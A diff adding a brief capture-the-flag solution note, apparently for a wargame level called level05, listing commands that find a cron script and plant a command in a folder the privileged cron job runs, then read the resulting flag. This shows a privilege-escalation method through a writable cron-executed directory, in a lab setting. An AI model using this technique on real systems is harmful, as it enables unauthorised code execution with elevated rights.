@@ -1,0 +1,5 @@
+find / -name level05 2>/dev/null -> file contains cron script
+cat /usr/sbin/openarenaserver -> cron runs scripts in folder every 2 minutes
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag
+wait for crone executing
+cat /tmp/flag
